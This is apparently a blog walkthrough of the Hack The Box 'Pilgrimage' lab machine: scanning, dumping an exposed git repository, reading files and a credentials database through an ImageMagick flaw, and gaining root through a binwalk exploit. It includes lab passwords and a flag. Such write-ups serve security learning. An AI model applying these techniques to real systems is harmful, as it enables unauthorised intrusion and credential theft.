---
title: "Pilgrimage Hack The Box Easy Machine"
layout: page
date: 2023-06-27
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: true
tag:
- Pilgrimage Writeup
- Pilgrimage Walkthrough
- Pilgrimage HTB Writeup
- Pilgrimage HTB
- htb monitorstwo
- htb 
- hasharmujahid
star: true
category: blog
author: Hashar Mujahid
description: Hi This Blog is the writeup of Pilgrimage Machine from Hack The Box.
---

![](https://i.imgur.com/qYn9qTm.png)



# NETWORK ENUMERATION

## TCP-SCAN
```bash
┌──(rizz㉿kraken)-[~/Documents/ctfs/pilgrimage]
└─$ sudo nmap -sC -sV -p- --min-rate 1500 10.10.11.219 -oN nmap-tcp-all.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 05:08 EDT
Nmap scan report for 10.10.11.219
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.29 seconds
                                                                  
```

Let's add `http://pilgrimage.htb/` to our /etc/hosts file.

We have a website running let's visit it.


# WEB ENUMERATION:


> Landing Page

![](https://i.imgur.com/OFDWCbe.png)


> Directory Scan


```bash
┌──(rizz㉿kraken)-[~/Documents/ctfs/pilgrimage]
└─$ dirsearch -u http://pilgrimage.htb/ 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/rizz/.dirsearch/reports/pilgrimage.htb/-_23-06-26_06-41-53.txt

Error Log: /home/rizz/.dirsearch/logs/errors-23-06-26_06-41-53.log

Target: http://pilgrimage.htb/

[06:41:53] Starting: 
[06:42:01] 403 -  555B  - /.git/branches/
[06:42:01] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/
[06:42:01] 403 -  555B  - /.git/
[06:42:01] 200 -   92B  - /.git/config
[06:42:01] 200 -   23B  - /.git/HEAD
[06:42:01] 403 -  555B  - /.git/hooks/
[06:42:01] 403 -  555B  - /.git/info/
[06:42:01] 403 -  555B  - /.git/logs/
[06:42:01] 200 -  195B  - /.git/logs/HEAD
[06:42:01] 200 -   73B  - /.git/description
[06:42:01] 200 -    4KB - /.git/index
[06:42:01] 403 -  555B  - /.git/objects/
[06:42:01] 403 -  555B  - /.git/refs/
[06:42:01] 200 -  195B  - /.git/logs/refs/heads/master
[06:42:01] 200 -  240B  - /.git/info/exclude
[06:42:02] 200 -   41B  - /.git/refs/heads/master
[06:42:02] 301 -  169B  - /.git/refs/tags  ->  http://pilgrimage.htb/.git/refs/tags/
[06:42:02] 200 -    2KB - /.git/COMMIT_EDITMSG
[06:42:02] 301 -  169B  - /.git/logs/refs/heads  ->  http://pilgrimage.htb/.git/logs/refs/heads/
[06:42:02] 301 -  169B  - /.git/refs/heads  ->  http://pilgrimage.htb/.git/refs/heads/
[06:42:02] 301 -  169B  - /.git/logs/refs  ->  http://pilgrimage.htb/.git/logs/refs/
[06:42:03] 403 -  555B  - /.ht_wsr.txt
[06:42:03] 403 -  555B  - /.htaccess_orig
[06:42:03] 403 -  555B  - /.htaccess_extra
[06:42:03] 403 -  555B  - /.htaccessBAK
[06:42:03] 403 -  555B  - /.htaccessOLD
[06:42:03] 403 -  555B  - /.htaccessOLD2
[06:42:03] 403 -  555B  - /.htaccess_sc
[06:42:03] 403 -  555B  - /.htaccess.save
[06:42:03] 403 -  555B  - /.htaccess.orig
[06:42:03] 403 -  555B  - /.html
[06:42:03] 403 -  555B  - /.htm
[06:42:03] 403 -  555B  - /.htpasswd_test
[06:42:03] 403 -  555B  - /.httr-oauth
[06:42:03] 403 -  555B  - /.htaccess.sample
[06:42:04] 403 -  555B  - /.htpasswds
[06:42:04] 403 -  555B  - /.htaccess.bak1
[06:42:40] 403 -  555B  - /admin/.htaccess
[06:42:58] 403 -  555B  - /administrator/.htaccess
[06:43:04] 403 -  555B  - /app/.htaccess
[06:43:07] 403 -  555B  - /assets/
[06:43:07] 301 -  169B  - /assets  ->  http://pilgrimage.htb/assets/
[06:43:28] 302 -    0B  - /dashboard.php  ->  /login.php
[06:43:52] 200 -    7KB - /index.php
[06:44:02] 200 -    6KB - /login.php
[06:44:04] 302 -    0B  - /logout.php  ->  /
[06:44:40] 200 -    6KB - /register.php
[06:45:02] 301 -  169B  - /tmp  ->  http://pilgrimage.htb/tmp/
[06:45:02] 403 -  555B  - /tmp/
[06:45:10] 403 -  555B  - /vendor/

```


Unique Endpoints:

```
/.git
/login
/register
/dashboard
/tmp
/app
```


> DUMP GIT


We can use git dumper tool to dump the git repository and analyze the code.

```bash
┌──(rizz㉿kraken)-[~/Documents/ctfs/pilgrimage]
└─$ git-dumper http://pilgrimage.htb/.git/ git-repo
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]

```

> Logs

![](https://i.imgur.com/5gpvw3f.png)

Found a  email address.
user : emily@pilgrimage.htb

> Code analysis

* Register.php
```php
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password']
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("INSERT INTO `users` (username,password) VALUES (?,?)");
  $status = $stmt->execute(array($username,$password));
  if($status) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /register.php?message=Registration failed&status=fail");
  }
}
?>
```


* Login.php
```php
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");
  }
}
?>
```

* Index.php
```php
<?php
session_start();
require_once "assets/bulletproof.php";
function isAuthenticated() {
  return json_encode(isset($_SESSION['user']));
}
function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
?>
```

The code in registration and login part seems good. But something seems fishy with the code in the code in index.php.

let's analyze it further.
``
1. `session_start();`: This function starts a new or resumes an existing session. It is used to enable session management in PHP.
    
2. `require_once "assets/bulletproof.php";`: This line includes the "bulletproof.php" file, which is a library for handling image uploads and processing.
    
3. `function isAuthenticated() { ... }`: This is a custom function that checks whether a user is authenticated by checking if the 'user' variable is set in the session. It returns a JSON-encoded boolean value indicating the authentication status.
    
4. `function returnUsername() { ... }`: This is another custom function that returns the username stored in the session. It wraps the username with double quotes and returns it as a string.
    
5. `if ($_SERVER['REQUEST_METHOD'] === 'POST') { ... }`: This condition checks if the request method is 'POST'. The code inside this block is executed when a form is submitted with the 'POST' method.
    
6. `$image = new Bulletproof\Image($_FILES);`: This line creates a new instance of the Bulletproof\Image class, passing the `$_FILES` superglobal variable as a parameter. This class provides methods for handling image uploads and processing.
    
7. `if($image["toConvert"]) { ... }`: This condition checks if an image file with the name "toConvert" is present in the uploaded files. This checks if an image was uploaded successfully.
    
8. `$image->setLocation("/var/www/pilgrimage.htb/tmp");`: This line sets the location where the uploaded image will be temporarily stored. In this case, it sets the directory path to "/var/www/pilgrimage.htb/tmp".
    
9. `$image->setSize(100, 4000000);`: This line sets the minimum and maximum file size in bytes that the uploaded image should be within. It specifies a minimum size of 100 bytes and a maximum size of 4,000,000 bytes (4MB).
    
10. `$image->setMime(array('png','jpeg'));`: This line sets the allowed MIME types for the uploaded image. Only 'png' and 'jpeg' MIME types are allowed.
    
11. `$upload = $image->upload();`: This line attempts to upload the image based on the previously set criteria. The uploaded image is stored in the $upload variable if the upload is successful.
    
12. `if($upload) { ... }`: This condition checks if the image upload was successful. If it was, the code inside this block is executed.
    
13. `$mime = ".png";`: This line sets the default file extension to ".png".
    
14. `$imagePath = $upload->getFullPath();`: This line retrieves the full path of the uploaded image file.
    
15. `if(mime_content_type($imagePath) === "image/jpeg") { ... }`: This condition checks if the MIME type of the uploaded image is "image/jpeg". If it is, the file extension is changed to ".jpeg".
    
16. `$newname = uniqid();`: This line generates a unique identifier that will be used as the new filename for the shrunk image.
    
17. `exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);`: This line executes a system command using the `exec()` function. It calls the "convert" command from the "magick" program, passing the paths of the original image, the desired shrunk image, and the resizxing parameters.

So now with the help of AI we can see what is going on with this code. 
The line 17 is the place where i think we can have some chances of execute code. Because it is executing system command in a unsafe way. 

### POTENTIAL COMMAND EXECUTION [Failed]
First let's see what are the parameters we control in this line.

* *`getName()` Function*

This function returns the name of the file we uploaded. But now you will be thinking what can we do with this. As useless it may seems we can actually try to upload a image with a file name which contains some quotes and also joins our payload in this execution.

![](https://i.imgur.com/ZxQ9M31.png)

On the listner side we dont get any response back.

![](https://i.imgur.com/jRt78Wb.png)

So this didn't work. Let's try something else and look deeper.
![](https://media.giphy.com/media/mtUQxyq3Ez5OvJtcae/giphy.gif)

### ARBITARY FILE READ IMAGEMAGICK
The magick binary is being used to shrink the size of the image we provided let's search for the exploits in the Imagemagick. 
After scouring the internet for the vulnerabilities i found this github exploit that takes a advantage of bug that allows user to read arbitary files from the system.

[LINK](https://github.com/voidz0r/CVE-2022-44268)

Let's test this.


* Steps.
1. Clone the git repo.
2. install cargo
3. run `Cargo run "/etc/passwd"`.
4. Now we will have a image.png in this directory ![](https://i.imgur.com/v5rtBem.png)
5. Now upload this on the shrink functionality.
6. After that copy the link that we get and download the image.![](https://i.imgur.com/PIwGPJS.png)
7.  Now run the `identify -verbose <image>` to analyze the meta date about the image.![](https://i.imgur.com/nTepJQO.png)
8. Now just copy this hex data and paste this in cyberchef.![](https://i.imgur.com/dItrSDx.png)

So now we have a POC that this magick binary is vulnerable to Arbitary file read.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```



Let's see if we can retrieve the database that we found in the login and registration code.
`/var/db/pilgrimage`

Let's perform the same steps and copy the content ot cyber chef

![](https://i.imgur.com/NE7cntd.png)

emails: admin@pilgrimage.htb , password: `admin123456`
emails: emily@pilgrimage.htb  , password: `bigchonkyboi123`

Now working on Login page  let's see something else or try them on ssh.
![](https://i.imgur.com/GCP038r.png)

092d1709475a24d76913c7a6a966cf41



# PRIVESC [ROOT]

Let's run linpeas and pspy to see if we find something intresting.

>Checklist Linpeas: 
1. No local service running like production web or service except ssh and server 80.
2. Can't run sudo
3. No SUID
4. No SGID
5. No Cronjobs

> PSPY

Let's run psp4 to find hidden processes.

![](https://i.imgur.com/2epnqrT.png)

This looks interesting.

Let's see it's content.
```bash
ily@pilgrimage:~$ ^C
emily@pilgrimage:~$ ^C
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done

```

This script make use of binwalk to analyse the file and it's content.
Well what i could do with this.

Checklist:
* Try injecting revshell in this script. [failed]
* Try exploiting symlinks. [failed]
* Try checking if the binary is exploitable. 

Binwalk version.

![](https://i.imgur.com/RVgbopo.png)

Let's see if we have any exploits available for this binary.

![](https://i.imgur.com/PU8IR1x.png)

https://www.exploit-db.com/exploits/51249


let's run this exploit.
![](https://i.imgur.com/ZtyrLgv.png)

After transferring the image to target move the image in `mv mine.png /var/www/pilgrimage.htb/shrunk/

![](https://i.imgur.com/1rouY4G.png)


`
After few seconds.

![](https://i.imgur.com/Ou1NcpD.png)


![](https://media.giphy.com/media/IHgdbU2dCDXVZpZVaQ/giphy.gif)


Yes it does :)
